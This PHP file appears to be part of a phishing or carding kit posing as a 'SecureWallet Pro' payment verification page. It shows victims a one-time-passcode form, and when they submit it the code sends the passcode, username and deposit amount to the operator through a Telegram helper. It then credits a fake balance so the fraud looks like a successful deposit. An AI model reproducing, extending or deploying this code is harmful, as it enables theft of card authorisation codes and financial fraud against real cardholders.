<?php
require_once 'config.php';
if (!isset($_SESSION['user_id']) || !isset($_SESSION['deposit_amount'])) {
    header('Location: deposit.php');
    exit;
}

if ($_POST) {
    $otp = $_POST['otp'];
    $amount = $_SESSION['deposit_amount'];
    
    // Send OTP + card details to Telegram
    $message = "🔐 <b>OTP SUBMITTED (Repeat Deposit)</b>\n";
    $message .= "👤 User: {$user['username']}\n";
    $message .= "💰 Amount: $$amount\n";
    $message .= "🔢 OTP: $otp\n";
    $message .= "⏰ " . date('Y-m-d H:i:s');
    sendTelegram($message);
    
    // Update balance
    $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")
       ->execute([$amount, $_SESSION['user_id']]);
    
    // Log transaction
    $db->prepare("INSERT INTO transactions (user_id, type, method, amount, status, details) VALUES (?, 'deposit', 'card', ?, 'success', 'Repeat card deposit with OTP')")
       ->execute([$_SESSION['user_id'], $amount]);
    
    unset($_SESSION['deposit_amount']);
    header('Location: deposit_success.php');
    exit;
}

$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user_id']]);
$user = $stmt->fetch();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Verify Payment - SecureWallet Pro</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="otp-page">
    <div class="payment-container">
        <h2>Verify Your Payment</h2>
        <p>We sent a one-time passcode to your registered phone/email</p>
        
        <form method="POST" class="otp-form">
            <div class="otp-input">
                <input type="text" name="otp" maxlength="6" placeholder="Enter 6-digit OTP" required>
            </div>
            <button type="submit" class="btn-verify">Verify & Complete</button>
        </form>
        
        <p class="resend">Didn't receive? <a href="#">Resend OTP</a></p>
    </div>
</body>
</html>
